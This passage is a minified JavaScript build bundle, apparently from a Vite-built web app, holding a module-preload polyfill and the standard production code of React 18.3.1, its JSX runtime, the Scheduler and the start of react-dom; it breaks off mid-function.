(function(){const t=document.createElement("link").relList;if(t&&t.supports&&t.supports("modulepreload"))return;for(const o of document.querySelectorAll('link[rel="modulepreload"]'))r(o);new MutationObserver(o=>{for(const l of o)if(l.type==="childList")for(const i of l.addedNodes)i.tagName==="LINK"&&i.rel==="modulepreload"&&r(i)}).observe(document,{childList:!0,subtree:!0});function n(o){const l={};return o.integrity&&(l.integrity=o.integrity),o.referrerPolicy&&(l.referrerPolicy=o.referrerPolicy),o.crossOrigin==="use-credentials"?l.credentials="include":o.crossOrigin==="anonymous"?l.credentials="omit":l.credentials="same-origin",l}function r(o){if(o.ep)return;o.ep=!0;const l=n(o);fetch(o.href,l)}})();function ic(e){return e&&e.__esModule&&Object.prototype.hasOwnProperty.call(e,"default")?e.default:e}var $s={exports:{}},no={},Ks={exports:{}},M={};/**
 * @license React
 * react.production.min.js
 *
 * Copyright (c) Facebook, Inc. and its affiliates.
 *
 * This source code is licensed under the MIT license found in the
 * LICENSE file in the root directory of this source tree.
 */var bn=Symbol.for("react.element"),sc=Symbol.for("react.portal"),ac=Symbol.for("react.fragment"),uc=Symbol.for("react.strict_mode"),cc=Symbol.for("react.profiler"),dc=Symbol.for("react.provider"),fc=Symbol.for("react.context"),pc=Symbol.for("react.forward_ref"),mc=Symbol.for("react.suspense"),hc=Symbol.for("react.memo"),gc=Symbol.for("react.lazy"),Ai=Symbol.iterator;function vc(e){return e===null||typeof e!="object"?null:(e=Ai&&e[Ai]||e["@@iterator"],typeof e=="function"?e:null)}var Qs={isMounted:function(){return!1},enqueueForceUpdate:function(){},enqueueReplaceState:function(){},enqueueSetState:function(){}},Gs=Object.assign,bs={};function ln(e,t,n){this.props=e,this.context=t,this.refs=bs,this.updater=n||Qs}ln.prototype.isReactComponent={};ln.prototype.setState=function(e,t){if(typeof e!="object"&&typeof e!="function"&&e!=null)throw Error("setState(...): takes an object of state variables to update or a function which returns an object of state variables.");this.updater.enqueueSetState(this,e,t,"setState")};ln.prototype.forceUpdate=function(e){this.updater.enqueueForceUpdate(this,e,"forceUpdate")};function Xs(){}Xs.prototype=ln.prototype;function Wl(e,t,n){this.props=e,this.context=t,this.refs=bs,this.updater=n||Qs}var Vl=Wl.prototype=new Xs;Vl.constructor=Wl;Gs(Vl,ln.prototype);Vl.isPureReactComponent=!0;var Fi=Array.isArray,Ys=Object.prototype.hasOwnProperty,Bl={current:null},Zs={key:!0,ref:!0,__self:!0,__source:!0};function qs(e,t,n){var r,o={},l=null,i=null;if(t!=null)for(r in t.ref!==void 0&&(i=t.ref),t.key!==void 0&&(l=""+t.key),t)Ys.call(t,r)&&!Zs.hasOwnProperty(r)&&(o[r]=t[r]);var s=arguments.length-2;if(s===1)o.children=n;else if(1<s){for(var a=Array(s),c=0;c<s;c++)a[c]=arguments[c+2];o.children=a}if(e&&e.defaultProps)for(r in s=e.defaultProps,s)o[r]===void 0&&(o[r]=s[r]);return{$$typeof:bn,type:e,key:l,ref:i,props:o,_owner:Bl.current}}function yc(e,t){return{$$typeof:bn,type:e.type,key:t,ref:e.ref,props:e.props,_owner:e._owner}}function Jl(e){return typeof e=="object"&&e!==null&&e.$$typeof===bn}function Sc(e){var t={"=":"=0",":":"=2"};return"$"+e.replace(/[=:]/g,function(n){return t[n]})}var zi=/\/+/g;function Co(e,t){return typeof e=="object"&&e!==null&&e.key!=null?Sc(""+e.key):t.toString(36)}function Sr(e,t,n,r,o){var l=typeof e;(l==="undefined"||l==="boolean")&&(e=null);var i=!1;if(e===null)i=!0;else switch(l){case"string":case"number":i=!0;break;case"object":switch(e.$$typeof){case bn:case sc:i=!0}}if(i)return i=e,o=o(i),e=r===""?"."+Co(i,0):r,Fi(o)?(n="",e!=null&&(n=e.replace(zi,"$&/")+"/"),Sr(o,t,n,"",function(c){return c})):o!=null&&(Jl(o)&&(o=yc(o,n+(!o.key||i&&i.key===o.key?"":(""+o.key).replace(zi,"$&/")+"/")+e)),t.push(o)),1;if(i=0,r=r===""?".":r+":",Fi(e))for(var s=0;s<e.length;s++){l=e[s];var a=r+Co(l,s);i+=Sr(l,t,n,a,o)}else if(a=vc(e),typeof a=="function")for(e=a.call(e),s=0;!(l=e.next()).done;)l=l.value,a=r+Co(l,s++),i+=Sr(l,t,n,a,o);else if(l==="object")throw t=String(e),Error("Objects are not valid as a React child (found: "+(t==="[object Object]"?"object with keys {"+Object.keys(e).join(", ")+"}":t)+"). If you meant to render a collection of children, use an array instead.");return i}function nr(e,t,n){if(e==null)return e;var r=[],o=0;return Sr(e,r,"","",function(l){return t.call(n,l,o++)}),r}function wc(e){if(e._status===-1){var t=e._result;t=t(),t.then(function(n){(e._status===0||e._status===-1)&&(e._status=1,e._result=n)},function(n){(e._status===0||e._status===-1)&&(e._status=2,e._result=n)}),e._status===-1&&(e._status=0,e._result=t)}if(e._status===1)return e._result.default;throw e._result}var se={current:null},wr={transition:null},kc={ReactCurrentDispatcher:se,ReactCurrentBatchConfig:wr,ReactCurrentOwner:Bl};function ea(){throw Error("act(...) is not supported in production builds of React.")}M.Children={map:nr,forEach:function(e,t,n){nr(e,function(){t.apply(this,arguments)},n)},count:function(e){var t=0;return nr(e,function(){t++}),t},toArray:function(e){return nr(e,function(t){return t})||[]},only:function(e){if(!Jl(e))throw Error("React.Children.only expected to receive a single React element child.");return e}};M.Component=ln;M.Fragment=ac;M.Profiler=cc;M.PureComponent=Wl;M.StrictMode=uc;M.Suspense=mc;M.__SECRET_INTERNALS_DO_NOT_USE_OR_YOU_WILL_BE_FIRED=kc;M.act=ea;M.cloneElement=function(e,t,n){if(e==null)throw Error("React.cloneElement(...): The argument must be a React element, but you passed "+e+".");var r=Gs({},e.props),o=e.key,l=e.ref,i=e._owner;if(t!=null){if(t.ref!==void 0&&(l=t.ref,i=Bl.current),t.key!==void 0&&(o=""+t.key),e.type&&e.type.defaultProps)var s=e.type.defaultProps;for(a in t)Ys.call(t,a)&&!Zs.hasOwnProperty(a)&&(r[a]=t[a]===void 0&&s!==void 0?s[a]:t[a])}var a=arguments.length-2;if(a===1)r.children=n;else if(1<a){s=Array(a);for(var c=0;c<a;c++)s[c]=arguments[c+2];r.children=s}return{$$typeof:bn,type:e.type,key:o,ref:l,props:r,_owner:i}};M.createContext=function(e){return e={$$typeof:fc,_currentValue:e,_currentValue2:e,_threadCount:0,Provider:null,Consumer:null,_defaultValue:null,_globalName:null},e.Provider={$$typeof:dc,_context:e},e.Consumer=e};M.createElement=qs;M.createFactory=function(e){var t=qs.bind(null,e);return t.type=e,t};M.createRef=function(){return{current:null}};M.forwardRef=function(e){return{$$typeof:pc,render:e}};M.isValidElement=Jl;M.lazy=function(e){return{$$typeof:gc,_payload:{_status:-1,_result:e},_init:wc}};M.memo=function(e,t){return{$$typeof:hc,type:e,compare:t===void 0?null:t}};M.startTransition=function(e){var t=wr.transition;wr.transition={};try{e()}finally{wr.transition=t}};M.unstable_act=ea;M.useCallback=function(e,t){return se.current.useCallback(e,t)};M.useContext=function(e){return se.current.useContext(e)};M.useDebugValue=function(){};M.useDeferredValue=function(e){return se.current.useDeferredValue(e)};M.useEffect=function(e,t){return se.current.useEffect(e,t)};M.useId=function(){return se.current.useId()};M.useImperativeHandle=function(e,t,n){return se.current.useImperativeHandle(e,t,n)};M.useInsertionEffect=function(e,t){return se.current.useInsertionEffect(e,t)};M.useLayoutEffect=function(e,t){return se.current.useLayoutEffect(e,t)};M.useMemo=function(e,t){return se.current.useMemo(e,t)};M.useReducer=function(e,t,n){return se.current.useReducer(e,t,n)};M.useRef=function(e){return se.current.useRef(e)};M.useState=function(e){return se.current.useState(e)};M.useSyncExternalStore=function(e,t,n){return se.current.useSyncExternalStore(e,t,n)};M.useTransition=function(){return se.current.useTransition()};M.version="18.3.1";Ks.exports=M;var Oe=Ks.exports;const Cc=ic(Oe);/**
 * @license React
 * react-jsx-runtime.production.min.js
 *
 * Copyright (c) Facebook, Inc. and its affiliates.
 *
 * This source code is licensed under the MIT license found in the
 * LICENSE file in the root directory of this source tree.
 */var Tc=Oe,xc=Symbol.for("react.element"),Ec=Symbol.for("react.fragment"),Pc=Object.prototype.hasOwnProperty,jc=Tc.__SECRET_INTERNALS_DO_NOT_USE_OR_YOU_WILL_BE_FIRED.ReactCurrentOwner,Rc={key:!0,ref:!0,__self:!0,__source:!0};function ta(e,t,n){var r,o={},l=null,i=null;n!==void 0&&(l=""+n),t.key!==void 0&&(l=""+t.key),t.ref!==void 0&&(i=t.ref);for(r in t)Pc.call(t,r)&&!Rc.hasOwnProperty(r)&&(o[r]=t[r]);if(e&&e.defaultProps)for(r in t=e.defaultProps,t)o[r]===void 0&&(o[r]=t[r]);return{$$typeof:xc,type:e,key:l,ref:i,props:o,_owner:jc.current}}no.Fragment=Ec;no.jsx=ta;no.jsxs=ta;$s.exports=no;var y=$s.exports,Go={},na={exports:{}},ye={},ra={exports:{}},oa={};/**
 * @license React
 * scheduler.production.min.js
 *
 * Copyright (c) Facebook, Inc. and its affiliates.
 *
 * This source code is licensed under the MIT license found in the
 * LICENSE file in the root directory of this source tree.
 */(function(e){function t(x,R){var N=x.length;x.push(R);e:for(;0<N;){var J=N-1>>>1,b=x[J];if(0<o(b,R))x[J]=R,x[N]=b,N=J;else break e}}function n(x){return x.length===0?null:x[0]}function r(x){if(x.length===0)return null;var R=x[0],N=x.pop();if(N!==R){x[0]=N;e:for(var J=0,b=x.length,er=b>>>1;J<er;){var gt=2*(J+1)-1,ko=x[gt],vt=gt+1,tr=x[vt];if(0>o(ko,N))vt<b&&0>o(tr,ko)?(x[J]=tr,x[vt]=N,J=vt):(x[J]=ko,x[gt]=N,J=gt);else if(vt<b&&0>o(tr,N))x[J]=tr,x[vt]=N,J=vt;else break e}}return R}function o(x,R){var N=x.sortIndex-R.sortIndex;return N!==0?N:x.id-R.id}if(typeof performance=="object"&&typeof performance.now=="function"){var l=performance;e.unstable_now=function(){return l.now()}}else{var i=Date,s=i.now();e.unstable_now=function(){return i.now()-s}}var a=[],c=[],p=1,h=null,m=3,S=!1,w=!1,k=!1,F=typeof setTimeout=="function"?setTimeout:null,d=typeof clearTimeout=="function"?clearTimeout:null,u=typeof setImmediate<"u"?setImmediate:null;typeof navigator<"u"&&navigator.scheduling!==void 0&&navigator.scheduling.isInputPending!==void 0&&navigator.scheduling.isInputPending.bind(navigator.scheduling);function f(x){for(var R=n(c);R!==null;){if(R.callback===null)r(c);else if(R.startTime<=x)r(c),R.sortIndex=R.expirationTime,t(a,R);else break;R=n(c)}}function g(x){if(k=!1,f(x),!w)if(n(a)!==null)w=!0,So(T);else{var R=n(c);R!==null&&wo(g,R.startTime-x)}}function T(x,R){w=!1,k&&(k=!1,d(j),j=-1),S=!0;var N=m;try{for(f(R),h=n(a);h!==null&&(!(h.expirationTime>R)||x&&!Pe());){var J=h.callback;if(typeof J=="function"){h.callback=null,m=h.priorityLevel;var b=J(h.expirationTime<=R);R=e.unstable_now(),typeof b=="function"?h.callback=b:h===n(a)&&r(a),f(R)}else r(a);h=n(a)}if(h!==null)var er=!0;else{var gt=n(c);gt!==null&&wo(g,gt.startTime-R),er=!1}return er}finally{h=null,m=N,S=!1}}var E=!1,P=null,j=-1,B=5,O=-1;function Pe(){return!(e.unstable_now()-O<B)}function un(){if(P!==null){var x=e.unstable_now();O=x;var R=!0;try{R=P(!0,x)}finally{R?cn():(E=!1,P=null)}}else E=!1}var cn;if(typeof u=="function")cn=function(){u(un)};else if(typeof MessageChannel<"u"){var Ii=new MessageChannel,lc=Ii.port2;Ii.port1.onmessage=un,cn=function(){lc.postMessage(null)}}else cn=function(){F(un,0)};function So(x){P=x,E||(E=!0,cn())}function wo(x,R){j=F(function(){x(e.unstable_now())},R)}e.unstable_IdlePriority=5,e.unstable_ImmediatePriority=1,e.unstable_LowPriority=4,e.unstable_NormalPriority=3,e.unstable_Profiling=null,e.unstable_UserBlockingPriority=2,e.unstable_cancelCallback=function(x){x.callback=null},e.unstable_continueExecution=function(){w||S||(w=!0,So(T))},e.unstable_forceFrameRate=function(x){0>x||125<x?console.error("forceFrameRate takes a positive int between 0 and 125, forcing frame rates higher than 125 fps is not supported"):B=0<x?Math.floor(1e3/x):5},e.unstable_getCurrentPriorityLevel=function(){return m},e.unstable_getFirstCallbackNode=function(){return n(a)},e.unstable_next=function(x){switch(m){case 1:case 2:case 3:var R=3;break;default:R=m}var N=m;m=R;try{return x()}finally{m=N}},e.unstable_pauseExecution=function(){},e.unstable_requestPaint=function(){},e.unstable_runWithPriority=function(x,R){switch(x){case 1:case 2:case 3:case 4:case 5:break;default:x=3}var N=m;m=x;try{return R()}finally{m=N}},e.unstable_scheduleCallback=function(x,R,N){var J=e.unstable_now();switch(typeof N=="object"&&N!==null?(N=N.delay,N=typeof N=="number"&&0<N?J+N:J):N=J,x){case 1:var b=-1;break;case 2:b=250;break;case 5:b=1073741823;break;case 4:b=1e4;break;default:b=5e3}return b=N+b,x={id:p++,callback:R,priorityLevel:x,startTime:N,expirationTime:b,sortIndex:-1},N>J?(x.sortIndex=N,t(c,x),n(a)===null&&x===n(c)&&(k?(d(j),j=-1):k=!0,wo(g,N-J))):(x.sortIndex=b,t(a,x),w||S||(w=!0,So(T))),x},e.unstable_shouldYield=Pe,e.unstable_wrapCallback=function(x){var R=m;return function(){var N=m;m=R;try{return x.apply(this,arguments)}finally{m=N}}}})(oa);ra.exports=oa;var Nc=ra.exports;/**
 * @license React
 * react-dom.production.min.js
 *
 * Copyright (c) Facebook, Inc. and its affiliates.
 *
 * This source code is licensed under the MIT license found in the
 * LICENSE file in the root directory of this source tree.
 */var Mc=Oe,ve=Nc;function v(e){for(var t="https://reactjs.org/docs/error-decoder.html?invariant="+e,n=1;n<arguments.length;n++)t+="&args[]="+encodeURIComponent(arguments[n]);return"Minified React error #"+e+"; visit "+t+" for the full message or use the non-minified dev environment for full errors and additional helpful warnings."}var la=new Set,Ln={};function Mt(e,t){Zt(e,t),Zt(e+"Capture",t)}function Zt(e,t){for(Ln[e]=t,e=0;e<t.length;e++)la.add(t[e])}var $e=!(typeof window>"u"||typeof window.document>"u"||typeof window.document.createElement>"u"),bo=Object.prototype.hasOwnProperty,Oc=/^[:A-Z_a-z\u00C0-\u00D6\u00D8-\u00F6\u00F8-\u02FF\u0370-\u037D\u037F-\u1FFF\u200C-\u200D\u2070-\u218F\u2C00-\u2FEF\u3001-\uD7FF\uF900-\uFDCF\uFDF0-\uFFFD][:A-Z_a-z\u00C0-\u00D6\u00D8-\u00F6\u00F8-\u02FF\u0370-\u037D\u037F-\u1FFF\u200C-\u200D\u2070-\u218F\u2C00-\u2FEF\u3001-\uD7FF\uF900-\uFDCF\uFDF0-\uFFFD\-.0-9\u00B7\u0300-\u036F\u203F-\u2040]*$/,Hi={},Ui={};function Lc(e){return bo.call(Ui,e)?!0:bo.call(Hi,e)?!1:Oc.test(e)?Ui[e]=!0:(Hi[e]=!0,!1)}function Dc(e,t,n,r){if(n!==null&&n.type===0)return!1;switch(typeof t){case"function":case"symbol":return!0;case"boolean":return r?!1:n!==null?!n.acceptsBooleans:(e=e.toLowerCase().slice(0,5),e!=="data-"&&e!=="aria-");default:return!1}}function _c(e,t,n,r){if(t===null||typeof t>"u"||Dc(e,t,n,r))return!0;if(r)return!1;if(n!==null)switch(n.type){case 3:return!t;case 4:return t===!1;case 5:return isNaN(t);case 6:return isNaN(t)||1>t}return!1}function ae(e,t,n,r,o,l,i){this.acceptsBooleans=t===2||t===3||t===4,this.attributeName=r,this.attributeNamespace=o,this.mustUseProperty=n,this.propertyName=e,this.type=t,this.sanitizeURL=l,this.removeEmptyString=i}var ee={};"children dangerouslySetInnerHTML defaultValue defaultChecked innerHTML suppressContentEditableWarning suppressHydrationWarning style".split(" ").forEach(function(e){ee[e]=new ae(e,0,!1,e,null,!1,!1)});[["acceptCharset","accept-charset"],["className","class"],["htmlFor","for"],["httpEquiv","http-equiv"]].forEach(function(e){var t=e[0];ee[t]=new ae(t,1,!1,e[1],null,!1,!1)});["contentEditable","draggable","spellCheck","value"].forEach(function(e){ee[e]=new ae(e,2,!1,e.toLowerCase(),null,!1,!1)});["autoReverse","externalResourcesRequired","focusable","preserveAlpha"].forEach(function(e){ee[e]=new ae(e,2,!1,e,null,!1,!1)});"allowFullScreen async autoFocus autoPlay controls default defer disabled disablePictureInPicture disableRemotePlayback formNoValidate hidden loop noModule noValidate open playsInline readOnly required reversed scoped seamless itemScope".split(" ").forEach(function(e){ee[e]=new ae(e,3,!1,e.toLowerCase(),null,!1,!1)});["checked","multiple","muted","selected"].forEach(function(e){ee[e]=new ae(e,3,!0,e,null,!1,!1)});["capture","download"].forEach(function(e){ee[e]=new ae(e,4,!1,e,null,!1,!1)});["cols","rows","size","span"].forEach(function(e){ee[e]=new ae(e,6,!1,e,null,!1,!1)});["rowSpan","start"].forEach(function(e){ee[e]=new ae(e,5,!1,e.toLowerCase(),null,!1,!1)});var $l=/[\-:]([a-z])/g;function Kl(e){return e[1].toUpperCase()}"accent-height alignment-baseline arabic-form baseline-shift cap-height clip-path clip-rule color-interpolation color-interpolation-filters color-profile color-rendering dominant-baseline enable-background fill-opacity fill-rule flood-color flood-opacity font-family font-size font-size-adjust font-stretch font-style font-variant font-weight glyph-name glyph-orientation-horizontal glyph-orientation-vertical horiz-adv-x horiz-origin-x image-rendering letter-spacing lighting-color marker-end marker-mid marker-start overline-position overline-thickness paint-order panose-1 pointer-events rendering-intent shape-rendering stop-color stop-opacity strikethrough-position strikethrough-thickness stroke-dasharray stroke-dashoffset stroke-linecap stroke-linejoin stroke-miterlimit stroke-opacity stroke-width text-anchor text-decoration text-rendering underline-position underline-thickness unicode-bidi unicode-range units-per-em v-alphabetic v-hanging v-ideographic v-mathematical vector-effect vert-adv-y vert-origin-x vert-origin-y word-spacing writing-mode xmlns:xlink x-height".split(" ").forEach(function(e){var t=e.replace($l,Kl);ee[t]=new ae(t,1,!1,e,null,!1,!1)});"xlink:actuate xlink:arcrole xlink:role xlink:show xlink:title xlink:type".split(" ").forEach(function(e){var t=e.replace($l,Kl);ee[t]=new ae(t,1,!1,e,"http://www.w3.org/1999/xlink",!1,!1)});["xml:base","xml:lang","xml:space"].forEach(function(e){var t=e.replace($l,Kl);ee[t]=new ae(t,1,!1,e,"http://www.w3.org/XML/1998/namespace",!1,!1)});["tabIndex","crossOrigin"].forEach(function(e){ee[e]=new ae(e,1,!1,e.toLowerCase(),null,!1,!1)});ee.xlinkHref=new ae("xlinkHref",1,!1,"xlink:href","http://www.w3.org/1999/xlink",!0,!1);["src","href","action","formAction"].forEach(function(e){ee[e]=new ae(e,1,!1,e.toLowerCase(),null,!0,!0)});function Ql(e,t,n,r){var o=ee.hasOwnProperty(t)?ee[t]:null;(o!==null?o.type!==0:r||!(2<t.length)||t[0]!=="o"&&t[0]!=="O"||t[1]!=="n"&&t[1]!=="N")&&(_c(t,n,o,r)&&(n=null),r||o===null?Lc(t)&&(n===null?e.removeAttribute(t):e.setAttribute(t,""+n)):o.mustUseProperty?e[o.propertyName]=n===null?o.type===3?!1:"":n:(t=o.attributeName,r=o.attributeNamespace,n===null?e.removeAttribute(t):(o=o.type,n=o===3||o===4&&n===!0?"":""+n,r?e.setAttributeNS(r,t,n):e.setAttribute(t,n))))}var be=Mc.__SECRET_INTERNALS_DO_NOT_USE_OR_YOU_WILL_BE_FIRED,rr=Symbol.for("react.element"),_t=Symbol.for("react.portal"),It=Symbol.for("react.fragment"),Gl=Symbol.for("react.strict_mode"),Xo=Symbol.for("react.profiler"),ia=Symbol.for("react.provider"),sa=Symbol.for("react.context"),bl=Symbol.for("react.forward_ref"),Yo=Symbol.for("react.suspense"),Zo=Symbol.for("react.suspense_list"),Xl=Symbol.for("react.memo"),Ye=Symbol.for("react.lazy"),aa=Symbol.for("react.offscreen"),Wi=Symbol.iterator;function dn(e){return e===null||typeof e!="object"?null:(e=Wi&&e[Wi]||e["@@iterator"],typeof e=="function"?e:null)}var W=Object.assign,To;function Sn(e){if(To===void 0)try{throw Error()}catch(n){var t=n.stack.trim().match(/\n( *(at )?)/);To=t&&t[1]||""}return`
`+To+e}var xo=!1;function Eo(e,t){if(!e||xo)return"";xo=!0;var n=Error.prepareStackTrace;Error.prepareStackTrace=void 0;try{if(t)if(t=function(){throw Error()},Object.defineProperty(t.prototype,"props",{set:function(){throw Error()}}),typeof Reflect=="object"&&Reflect.construct){try{Reflect.construct(t,[])}catch(c){var r=c}Reflect.construct(e,[],t)}else{try{t.call()}catch(c){r=c}e.call(t.prototype)}else{try{throw Error()}catch(c){r=c}e()}}catch(c){if(c&&r&&typeof c.stack=="string"){for(var o=c.stack.split(`
`),l=r.stack.split(`
`),i=o.length-1,s=l.length-1;1<=i&&0<=s&&o[i]!==l[s];)s--;for(;1<=i&&0<=s;i--,s--)if(o[i]!==l[s]){if(i!==1||s!==1)do if(i--,s--,0>s||o[i]!==l[s]){var a=`
`+o[i].replace(" at new "," at ");return e.displayName&&a.includes("<anonymous>")&&(a=a.replace("<anonymous>",e.displayName)),a}while(1<=i&&0<=s);break}}}finally{xo=!1,Error.prepareStackTrace=n}return(e=e?e.displayName||e.name:"")?Sn(e):""}function Ic(e){switch(e.tag){case 5:return Sn(e.type);case 16:return Sn("Lazy");case 13:return Sn("Suspense");case 19:return Sn("SuspenseList");case 0:case 2:case 15:return e=Eo(e.type,!1),e;case 11:return e=Eo(e.type.render,!1),e;case 1:return e=Eo(e.type,!0),e;default:return""}}function qo(e){if(e==null)return null;if(typeof e=="function")return e.displayName||e.name||null;if(typeof e=="string")return e;switch(e){case It:return"Fragment";case _t:return"Portal";case Xo:return"Profiler";case Gl:return"StrictMode";case Yo:return"Suspense";case Zo:return"SuspenseList"}if(typeof e=="object")switch(e.$$typeof){case sa:return(e.displayName||"Context")+".Consumer";case ia:return(e._context.displayName||"Context")+".Provider";case bl:var t=e.render;return e=e.displayName,e||(e=t.displayName||t.name||"",e=e!==""?"ForwardRef("+e+")":"ForwardRef"),e;case Xl:return t=e.displayName||null,t!==null?t:qo(e.type)||"Memo";case Ye:t=e._payload,e=e._init;try{return qo(e(t))}catch{}}return null}function Ac(e){var t=e.type;switch(e.tag){case 24:return"Cache";case 9:return(t.displayName||"Context")+".Consumer";case 10:return(t._context.displayName||"Context")+".Provider";case 18:return"DehydratedFragment";case 11:return e=t.render,e=e.displayName||e.name||"",t.displayName||(e!==""?"ForwardRef("+e+")":"ForwardRef");case 7:return"Fragment";case 5:return t;case 4:return"Portal";case 3:return"Root";case 6:return"Text";case 16:return qo(t);case 8:return t===Gl?"StrictMode":"Mode";case 22:return"Offscreen";case 12:return"Profiler";case 21:return"Scope";case 13:return"Suspense";case 19:return"SuspenseList";case 25:return"TracingMarker";case 1:case 0:case 17:case 2:case 14:case 15:if(typeof t=="function")return t.displayName||t.name||null;if(typeof t=="string")return t}return null}function dt(e){switch(typeof e){case"boolean":case"number":case"string":case"undefined":return e;case"object":return e;default:return""}}function ua(e){var t=e.type;return(e=e.nodeName)&&e.toLowerCase()==="input"&&(t==="checkbox"||t==="radio")}function Fc(e){var t=ua(e)?"checked":"value",n=Object.getOwnPropertyDescriptor(e.constructor.prototype,t),r=""+e[t];if(!e.hasOwnProperty(t)&&typeof n<"u"&&typeof n.get=="function"&&typeof n.set=="function"){var o=n.get,l=n.set;return Object.defineProperty(e,t,{configurable:!0,get:function(){return o.call(this)},set:function(i){r=""+i,l.call(this,i)}}),Object.defineProperty(e,t,{enumerable:n.enumerable}),{getValue:function(){return r},setValue:function(i){r=""+i},stopTracking:function(){e._valueTracker=null,delete e[t]}}}}function or(e){e._valueTracker||(e._valueTracker=Fc(e))}function ca(e){if(!e)return!1;var t=e._valueTracker;if(!t)return!0;var n=t.getValue(),r="";return e&&(r=ua(e)?e.checked?"true":"false":e.value),e=r,e!==n?(t.setValue(e),!0):!1}function Or(e){if(e=e||(typeof document<"u"?document:void 0),typeof e>"u")return null;try{return e.activeElement||e.body}catch{return e.body}}function el(e,t){var n=t.checked;return W({},t,{defaultChecked:void 0,defaultValue:void 0,value:void 0,checked:n??e._wrapperState.initialChecked})}function Vi(e,t){var n=t.defaultValue==null?"":t.defaultValue,r=t.checked!=null?t.checked:t.defaultChecked;n=dt(t.value!=null?t.value:n),e._wrapperState={initialChecked:r,initialValue:n,controlled:t.type==="checkbox"||t.type==="radio"?t.checked!=null:t.value!=null}}function da(e,t){t=t.checked,t!=null&&Ql(e,"checked",t,!1)}function tl(e,t){da(e,t);var n=dt(t.value),r=t.type;if(n!=null)r==="number"?(n===0&&e.value===""||e.value!=n)&&(e.value=""+n):e.value!==""+n&&(e.value=""+n);else if(r==="submit"||r==="reset"){e.removeAttribute("value");return}t.hasOwnProperty("value")?nl(e,t.type,n):t.hasOwnProperty("defaultValue")&&nl(e,t.type,dt(t.defaultValue)),t.checked==null&&t.defaultChecked!=null&&(e.defaultChecked=!!t.defaultChecked)}function Bi(e,t,n){if(t.hasOwnProperty("value")||t.hasOwnProperty("defaultValue")){var r=t.type;if(!(r!=="submit"&&r!=="reset"||t.value!==void 0&&t.value!==null))return;t=""+e._wrapperState.initialValue,n||t===e.value||(e.value=t),e.defaultValue=t}n=e.name,n!==""&&(e.name=""),e.defaultChecked=!!e._wrapperState.initialChecked,n!==""&&(e.name=n)}function nl(e,t,n){(t!=="number"||Or(e.ownerDocument)!==e)&&(n==null?e.defaultValue=""+e._wrapperState.initialValue:e.defaultValue!==""+n&&(e.defaultValue=""+n))}var wn=Array.isArray;function Kt(e,t,n,r){if(e=e.options,t){t={};for(var o=0;o<n.length;o++)t["$"+n[o]]=!0;for(n=0;n<e.length;n++)o=t.hasOwnProperty("$"+e[n].value),e[n].selected!==o&&(e[n].selected=o),o&&r&&(e[n].defaultSelected=!0)}else{for(n=""+dt(n),t=null,o=0;o<e.length;o++){if(e[o].value===n){e[o].selected=!0,r&&(e[o].defaultSelected=!0);return}t!==null||e[o].disabled||(t=e[o])}t!==null&&(t.selected=!0)}}function rl(e,t){if(t.dangerouslySetInnerHTML!=null)throw Error(v(91));return W({},t,{value:void 0,defaultValue:void 0,children:""+e._wrapperState.initialValue})}function Ji(e,t){var n=t.value;if(n==null){if(n=t.children,t=t.defaultValue,n!=null){if(t!=null)throw Error(v(92));if(wn(n)){if(1<n.length)throw Error(v(93));n=n[0]}t=n}t==null&&(t=""),n=t}e._wrapperState={initialValue:dt(n)}}function fa(e,t){var n=dt(t.value),r=dt(t.defaultValue);n!=null&&(n=""+n,n!==e.value&&(e.value=n),t.defaultValue==null&&e.defaultValue!==n&&(e.defaultValue=n)),r!=null&&(e.defaultValue=""+r)}function $i(e){var t=e.textContent;t===e._wrapperState.initialValue&&t!==""&&t!==null&&(e.value=t)}function pa(e){switch(e){case"svg":return"http://www.w3.org/2000/svg";case"math":return"http://www.w3.org/1998/Math/MathML";default:return"http://www.w3.org/1999/xhtml"}}function ol(e,t){return e==null||e==="http://www.w3.org/1999/xhtml"?pa(t):e==="http://www.w3.org/2000/svg"&&t==="foreignObject"?"http://www.w3.org/1999/xhtml":e}var lr,ma=function(e){return typeof MSApp<"u"&&MSApp.execUnsafeLocalFunction?function(t,n,r,o){MSApp.execUnsafeLocalFunction(function(){return e(t,n,r,o)})}:e}(function(e,t){if(e.namespaceURI!=="http://www.w3.org/2000/svg"||"innerHTML"in e)e.innerHTML=t;else{for(lr=lr||document.createElement("div"),lr.innerHTML="<svg>"+t.valueOf().toString()+"</svg>",t=lr.firstChild;e.firstChild;)e.removeChild(e.firstChild);for(;t.firstChild;)e.appendChild(t.firstChild)}});function Dn(e,t){if(t){var n=e.firstChild;if(n&&n===e.lastChild&&n.nodeType===3){n.nodeValue=t;return}}e.textContent=t}var Tn={animationIterationCount:!0,aspectRatio:!0,borderImageOutset:!0,borderImageSlice:!0,borderImageWidth:!0,boxFlex:!0,boxFlexGroup:!0,boxOrdinalGroup:!0,columnCount:!0,columns:!0,flex:!0,flexGrow:!0,flexPositive:!0,flexShrink:!0,flexNegative:!0,flexOrder:!0,gridArea:!0,gridRow:!0,gridRowEnd:!0,gridRowSpan:!0,gridRowStart:!0,gridColumn:!0,gridColumnEnd:!0,gridColumnSpan:!0,gridColumnStart:!0,fontWeight:!0,lineClamp:!0,lineHeight:!0,opacity:!0,order:!0,orphans:!0,tabSize:!0,widows:!0,zIndex:!0,zoom:!0,fillOpacity:!0,floodOpacity:!0,stopOpacity:!0,strokeDasharray:!0,strokeDashoffset:!0,strokeMiterlimit:!0,strokeOpacity:!0,strokeWidth:!0},zc=["Webkit","ms","Moz","O"];Object.keys(Tn).forEach(function(e){zc.forEach(function(t){t=t+e.charAt(0).toUpperCase()+e.substring(1),Tn[t]=Tn[e]})});function ha(e,t,n){return t==null||typeof t=="boolean"||t===""?"":n||typeof t!="number"||t===0||Tn.hasOwnProperty(e)&&Tn[e]?(""+t).trim():t+"px"}function ga(e,t){e=e.style;for(var n in t)if(t.hasOwnProperty(n)){var r=n.indexOf("--")===0,o=ha(n,t[n],r);n==="float"&&(n="cssFloat"),r?e.setProperty(n,o):e[n]=o}}var Hc=W({menuitem:!0},{area:!0,base:!0,br:!0,col:!0,embed:!0,hr:!0,img:!0,input:!0,keygen:!0,link:!0,meta:!0,param:!0,source:!0,track:!0,wbr:!0});function ll(e,t){if(t){if(Hc[e]&&(t.children!=null||t.dangerouslySetInnerHTML!=null))throw Error(v(137,e));if(t.dangerouslySetInnerHTML!=null){if(t.children!=null)throw Error(v(60));if(typeof t.dangerouslySetInnerHTML!="object"||!("__html"in t.dangerouslySetInnerHTML))throw Error(v(61))}if(t.style!=null&&typeof t.style!="object")throw Error(v(62))}}function il(e,t){if(e.indexOf("-")===-1)return typeof 